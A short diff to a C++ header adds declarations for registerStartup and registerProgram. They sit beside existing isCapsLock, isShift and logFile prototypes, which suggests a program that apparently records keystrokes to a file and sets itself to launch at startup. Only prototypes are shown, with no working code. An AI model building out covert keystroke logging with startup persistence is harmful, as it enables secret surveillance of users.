@@ -18,4 +18,7 @@ string dirBasename(string);
 bool isCapsLock();
 bool isShift();
 void logFile(ofstream&, string);
+BOOL registerStartup(PCWSTR, PCWSTR, PCWSTR);
+void registerProgram();
+
 #endif /* _FUNCTIONS_H */
